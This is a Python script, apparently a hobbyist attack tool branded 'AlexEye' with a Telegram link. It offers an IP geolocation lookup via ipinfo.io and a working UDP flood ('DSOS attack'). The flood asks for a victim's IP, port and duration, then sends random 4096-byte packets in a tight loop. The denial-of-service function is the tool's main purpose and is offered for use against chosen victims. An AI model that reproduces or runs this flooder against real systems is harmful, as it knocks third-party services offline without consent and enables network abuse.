import requests, json, os, socket, time, random
 
def ip():
	print('Choose IP-Adress (if you want to break your IP-Adress, do not enter anything).')
	ip = input('>>> ')
	if ip == '':
		try:
			response = requests.get('https://ipinfo.io/json')
		except:
			print('An error has occurred.')
			print('----------')
			main()
	else:
		try:
			response = requests.get('https://ipinfo.io/' + ip + '/json')
		except:
			print('An error has occurred.')
			print('----------')
			main()
	r = response.json()
	try:
		try:
			print('[IP] : ' + r['ip'])
		except:
			pass
		try:
			print('[Country] : ' + r['country'])
		except:
			pass
		try:
			print('[Region] : ' + r['region'])
		except:
			pass
		try:
			print('[City] : ' + r['city'])
		except:
			pass
		try:
			print('[Host name] : ' + r['hostname'])
		except:
			pass
		try:
			print('[Location] : ' + r['loc'])
		except:
			pass
		try:
			print('[Провайдер] : ' + r['org'])
		except:
			pass
		try:
			print('[Time zone] : ' + r['timezone'])
		except:
			pass
		try:
			print('[Post index] : ' +  r['postal'])
		except:
			pass
	except:
		print('An error has occurred.')
	print('----------')
	main()

def dos():
	print('Enter the victim s IP-Adress(if you want to use your own IP-Adress, do not enter anything).')
	ip = input('>>> ')
	if ip == '':
		ip = '127.0.0.1'
	print('Enter the port of the victim.')
	try:
		port = int(input('>>> '))
	except:
		print('An error has occurred.')
		print('----------')
		main()
	print('Enter attack time (in seconds).')
	try:
		duration = int(input('>>> '))
	except:
		print('An error has occurred.')
		print('----------')
		main()
	try:
		client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	except:
		print('ПAn error has occurred.')
	packages_sent = 0
	bytes = random._urandom(4096)
	timeout = time.time() + duration
	try:
		while True:
			if time.time() > timeout:
				break
			try:
				client.sendto(bytes, (ip, port))
			except socket.gaierror:
				print('An error has occurred.')
				break
			packages_sent += 1
			print(f'Sent {packages_sent} packages to {ip}:{port}. Press Ctrl+C to exit prematurely.')
	except KeyboardInterrupt:
		print('\nCompletion of the attack...')
		time.sleep(.3)
		print('----------')
		main()
	print('----------')
	main()

def main():
	print('[1] IP address breaking')
	print('[2] DSOS attack')
	print('[0] Exit')
	a = input('>>> ')
	if a == '1':
		ip()
	elif a == '2':
		dos()
	elif a == '0':
		print('Completion of the program...')
		time.sleep(1)
		exit()
	else:
		print('Invalid command.')
		print('----------')
		main()

def clear():
	if os.sys.platform == 'win32':
		os.system('cls')
	else:
		os.system('clear')

def banner():
	print('''           _             ______           ''')
	print('''     /\   | |           |  ____|          ''')
	print('''    /  \  | | _____  __ | |__  _   _  ___ ''')
	print('''   / /\ \ | |/ _ \ \/ / |  __|| | | |/ _ \''')
	print('''  / ____ \| |  __/>  <  | |___| |_| |  __/''')
	print(''' /_/    \_\_|\___/_/\_\ |______\__, |\___|''')
	print('''                                __/ |     ''')
	print('''                               |___/      ''')
	print('Telegram: https://t.me/hack_alex\n')

if __name__ == '__main__':
	clear()
	banner()
	main()
